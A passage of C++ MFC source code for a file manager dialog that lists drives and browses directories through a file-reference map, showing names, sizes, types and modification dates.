			m_911 = m_CEdit_Cmd_Main.GetWindowTextLength();  //重新定位m_nCurSel  m_nCurSel = 3
		}*/
	}
	
	return CDialog::PreTranslateMessage(pMsg);
}
VOID CFileManagerDlg::FixedServerVolumeInfo()
{
	m_CListCtrl_Server_File.DeleteAllItems();
	while (m_CListCtrl_Server_File.DeleteColumn(0) != 0);
	
	
	//初始化列表信息
	//m_CurrentPathReference = 0;	// 显示磁盘 - m_CurrenPathReference 就是 0
	// 记录
	//m_PathHistroy.emplace_back(m_CurrentPathReference);
	
	//CurrentPathIt = --m_PathHistroy.end();		// 指向最后一个插入的元素
	
	m_CListCtrl_Server_File.InsertColumn(0, "名称", LVCFMT_CENTER, 40);
	m_CListCtrl_Server_File.InsertColumn(1, "类型", LVCFMT_CENTER, 80);
	m_CListCtrl_Server_File.InsertColumn(2, "文件系统", LVCFMT_CENTER, 80);
	m_CListCtrl_Server_File.InsertColumn(3, "总大小", LVCFMT_CENTER, 80);
	m_CListCtrl_Server_File.InsertColumn(4, "可用空间", LVCFMT_CENTER, 80);
	m_CListCtrl_Server_File.InsertColumn(5, "Reference", LVCFMT_CENTER, 0);	// 隐藏列放在最前面 - 记录Reference 方便后面的遍历

	m_CListCtrl_Server_File.SetExtendedStyle(m_CListCtrl_Server_File.GetExtendedStyle()
		| LVS_EX_FULLROWSELECT);

	CHAR	FileSystem[MAX_PATH] = { 0 };     //ntfs 
	unsigned __int64	HardDiskAmountBytes = 0;   
	unsigned __int64	HardDiskFreeSpaceBytes = 0;
	unsigned long		HardDiskAmountMB = 0;      // 总大小
	unsigned long		HardDiskFreeSpaceMB = 0;   // 剩余空间
	int  VolumeCount = 0;
	CHAR VolumeValue[] = "A:\\";
	for (vector<_CVolume>::iterator i = m_Volumes.begin(); i != m_Volumes.end(); i++)
	{
		VolumeValue[0] = i->m_VolumeValue;
		GetVolumeInformationA(VolumeValue, NULL, 0, NULL, NULL, NULL, FileSystem, MAX_PATH);

		ULONG	FileSystemLength = lstrlen(FileSystem) + 1;
		if (GetDiskFreeSpaceEx(VolumeValue,
			(PULARGE_INTEGER)&HardDiskFreeSpaceBytes, (PULARGE_INTEGER)&HardDiskAmountBytes, NULL))
		{
			HardDiskAmountMB = HardDiskAmountBytes / 1024 / 1024;
			HardDiskFreeSpaceMB = HardDiskFreeSpaceBytes / 1024 / 1024;
		}
		else
		{
			HardDiskAmountMB = 0;
			HardDiskFreeSpaceMB = 0;
		}


		int	Item = m_CListCtrl_Server_File.InsertItem(VolumeCount, 
			VolumeValue, GetServerIconInfo(VolumeValue, NULL, GetFileAttributes(VolumeValue)));    //获得系统的图标		

		m_CListCtrl_Server_File.SetItemData(Item, 1);  //隐藏数据 1=目录 0=文件
		
		SHFILEINFO	sfi;
		SHGetFileInfo(VolumeValue, FILE_ATTRIBUTE_NORMAL, 
			&sfi, sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
		m_CListCtrl_Server_File.SetItemText(Item, 1, sfi.szTypeName); //本地磁盘 移动磁盘
		m_CListCtrl_Server_File.SetItemText(Item, 2, FileSystem);     //文件系统
		CString	v1;
		v1.Format("%10.1f GB", (float)HardDiskAmountMB / 1024);
		m_CListCtrl_Server_File.SetItemText(Item, 3, v1);
		v1.Format("%10.1f GB", (float)HardDiskFreeSpaceMB / 1024);
		m_CListCtrl_Server_File.SetItemText(Item, 4, v1);
		CString Reference;
		Reference.Format("%lld", 0x5000000000005);
		m_CListCtrl_Server_File.SetItemText(Item, 5, Reference);
		VolumeCount++;
	}
}
int	CFileManagerDlg::GetServerIconInfo(LPCTSTR VolumeValue, LPCTSTR FileFullPathData,
	DWORD FileAttributes)
{
	SHFILEINFO	sfi;
	if (FileAttributes == INVALID_FILE_ATTRIBUTES)
		FileAttributes = FILE_ATTRIBUTE_NORMAL;
	else
		FileAttributes |= FILE_ATTRIBUTE_NORMAL;

	SHGetFileInfo
	(
		VolumeValue,
		FileAttributes,
		&sfi,
		sizeof(SHFILEINFO),
		SHGFI_SYSICONINDEX | SHGFI_USEFILEATTRIBUTES | SHGFI_ICON
	);

	// 3 是系统文件夹图标索引 - 在这里进行判断，使用自己的文件夹图标
	if (sfi.iIcon == 3)
	{
		if (PathIsDirectoryEmptyA(FileFullPathData))
		{
			//return m_EmptyFolderIconIndex;
		}
		else
		{

		}
			//return m_FolderIconIndex;
	}
	else
	{
		return sfi.iIcon;
	}

	return sfi.iIcon;
}
VOID CFileManagerDlg::FixedServerFileInfoUSN(CString FileDirectory)
{       
	vector<FILE_NODE> FindedFiles;   //当前目录下的所有信息  
						 //                                            0x5000000000005
	CString Reference;   //Map数据结构的索引  【USN_NODE】【USN_NODE】【USN_NODE】【USN_NODE】【】【】【】
	
	if (FileDirectory.GetLength() == 0)
	{
		int	Item = m_CListCtrl_Server_File.GetSelectionMark();

		//选择有项目
		if (Item != -1)
		{		
			//该项为目录
			if (m_CListCtrl_Server_File.GetItemData(Item) == 1)   
			{
				
				FileDirectory = m_CListCtrl_Server_File.GetItemText(Item, 0);
				CHeaderCtrl* v1 = m_CListCtrl_Server_File.GetHeaderCtrl();  //获得该排
				
				//该排中有多少个显示的信息(有几列)
				int Count = v1->GetItemCount();
				if (Count == 6)  //根目录  C:\  D:\  
				{
					// 根目录打开
					Reference.Format("%lld", 0x5000000000005);
					// 设置当前所在的盘符类
					for (vector<_CVolume>::iterator i = m_Volumes.begin(); i != m_Volumes.end(); i++)
					{
						if (i->m_VolumeValue == FileDirectory[0])
						{
							//i实际上是_CVolume的指针
							m_Volume = i;
							break;
						}					
					}
					m_CurrentPathReferenceFileServer = 0x5000000000005;
				}
				else if (Count == 5)  //除了根目录
				{
					//打开一般文件夹
					Reference = m_CListCtrl_Server_File.GetItemText(Item, 4);
					m_CurrentPathReferenceFileServer = _atoi64(Reference);
				}
			}
		}
		// 从组合框里得到路径
		else
		{
		   // m_CCombo_File_Server.GetWindowText(m_File_Server_Path);
		}
	}

	
	if (FileDirectory == "..")
	{
		GetParentDirectory(m_ParentDirectoryFileServer,m_ParentDirectoryFileServer);

		m_CurrentPathReferenceFileServer = m_Volume->FindParentReference(m_CurrentPathReferenceFileServer);
		Reference.Format("%lld", m_CurrentPathReferenceFileServer);

	}
	else if (FileDirectory != ".")   
	{
	
		m_ParentDirectoryFileServer += FileDirectory;
		if (m_ParentDirectoryFileServer.Right(1) != "\\")
		{
			m_ParentDirectoryFileServer += "\\";
		}

		// 插入记录 vector
		//m_PathHistroy.emplace_back(m_CurrentPathReference);
		//CurrentPathIt = --m_PathHistroy.end();
	}
	else  
	{
	
	}


	// 回到电脑根目录
	if (m_ParentDirectoryFileServer.GetLength() == 0 || m_CurrentPathReferenceFileServer == 0)
	{
		FixedServerVolumeInfo();  //刷磁盘信息
		return;
	}

	// 插入Combox
	/*m_CCombo_File_Server.InsertString(0, m_File_Server_Path);
	m_CCombo_File_Server.SetCurSel(0);*/
	//CListCtrl初始化
	m_CListCtrl_Server_File.DeleteAllItems();  
	while (m_CListCtrl_Server_File.DeleteColumn(0) != 0);  //删除
	m_CListCtrl_Server_File.InsertColumn(0, "名称", LVCFMT_LEFT, 150);
	m_CListCtrl_Server_File.InsertColumn(1, "大小", LVCFMT_LEFT, 100);
	m_CListCtrl_Server_File.InsertColumn(2, "类型", LVCFMT_LEFT, 100);
	m_CListCtrl_Server_File.InsertColumn(3, "修改日期", LVCFMT_LEFT, 115);
	m_CListCtrl_Server_File.InsertColumn(4, "Reference", LVCFMT_LEFT, 0);
	
	int	FileCount = 0;  //排
	int ItemCount = 0;  //列

	// .. 返回上层目录
	ItemCount = m_CListCtrl_Server_File.InsertItem(FileCount++, "..", 
		GetServerIconInfo(NULL, NULL, FILE_ATTRIBUTE_DIRECTORY));
	
	m_CListCtrl_Server_File.SetItemText(ItemCount, 4, Reference);
	
	m_CListCtrl_Server_File.SetItemData(ItemCount, 1);      //不显示的信息      


	int i = 0;
	
	HANDLE FileHandle = INVALID_HANDLE_VALUE;
	
	// 遍历map
	m_Volume->FindFile(_atoi64(Reference), FindedFiles);  //在Map数据结构中查询信息
	for (vector<FILE_NODE>::iterator i = FindedFiles.begin(); i != FindedFiles.end(); ++i)
	{
		ItemCount = m_CListCtrl_Server_File.InsertItem(FileCount, 
			i->FileNameData,
			GetServerIconInfo(i->FileNameData,
				m_ParentDirectoryFileServer +i->FileNameData, 
				GetFileAttributes(m_ParentDirectoryFileServer + i->FileNameData)));	//  插入CtrlList
		DWORD FileAttributes = 0;
			
		if (PathIsDirectoryA(m_ParentDirectoryFileServer + i->FileNameData))
		{
			FileHandle = CreateFileA(m_ParentDirectoryFileServer + i->FileNameData,
				GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
			if (FileHandle == INVALID_HANDLE_VALUE)
			{
				continue;
			}
			m_CListCtrl_Server_File.SetItemText(ItemCount, 1, 0);   //文件大小
			m_CListCtrl_Server_File.SetItemText(ItemCount, 2, "文件夹");


			FILETIME LastWriteTime = { 0 };
			GetFileTime(FileHandle, NULL, NULL, &LastWriteTime);
			m_CListCtrl_Server_File.SetItemText(ItemCount, 3, CTime(LastWriteTime).Format("%Y-%m-%d %H:%M"));

			m_CListCtrl_Server_File.SetItemData(ItemCount, 1);      //不显示隐式数据 
			
			CloseHandle(FileHandle);
			FileHandle = INVALID_HANDLE_VALUE;

		}
		else
		{
			FileHandle = CreateFileA(m_ParentDirectoryFileServer + i->FileNameData,
				GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			if (FileHandle == INVALID_HANDLE_VALUE)
			{
				continue;
			}

			LARGE_INTEGER FileSize = { 0 };
			GetFileSizeEx(FileHandle, &FileSize);
			CString v1;
			v1.Format("%10d KB", FileSize.QuadPart / 1024 + (FileSize.QuadPart % 1024 ? 1 : 0));
			m_CListCtrl_Server_File.SetItemText(ItemCount, 1, v1);

			SHFILEINFO	SHFileInfo = { 0 };
			SHGetFileInfoA(i->FileNameData, FILE_ATTRIBUTE_NORMAL,
				&SHFileInfo, sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
			m_CListCtrl_Server_File.SetItemText(ItemCount, 2, SHFileInfo.szTypeName);



			FILETIME LastWriteTime = { 0 };
			GetFileTime(FileHandle, nullptr, nullptr, &LastWriteTime);
			m_CListCtrl_Server_File.SetItemText(ItemCount, 3, CTime(LastWriteTime).Format("%Y-%m-%d %H:%M"));
			m_CListCtrl_Server_File.SetItemData(ItemCount, 0);
			
			CloseHandle(FileHandle);
			FileHandle = INVALID_HANDLE_VALUE;

		}									
		Reference.Format("%lld", i->FileReferenceNumber);
		m_CListCtrl_Server_File.SetItemText(ItemCount, 4, Reference);
	
		FileCount++;
	}
}
BOOL CFileManagerDlg::GetParentDirectory(CString& DestinationString, CString& SourceString)
{
	if (SourceString.IsEmpty())
	{
		return FALSE;
	}
	int Index = SourceString.ReverseFind('\\');
	if (Index == -1)
	{
		return FALSE;
	}
	printf("Index:%d\r\n", Index);
	DestinationString = SourceString.Left(Index);
	Index = DestinationString.ReverseFind('\\');
	printf("Index:%d\r\n", Index);
	if (Index == -1)
	{
		DestinationString = "";
		return TRUE;
	}
	DestinationString = DestinationString.Left(Index);
	if (DestinationString.Right(1) != "\\")
	{
		DestinationString += "\\";
	}
	if (DestinationString.IsEmpty())
	{
		return FALSE;
	}	
	return TRUE;
}






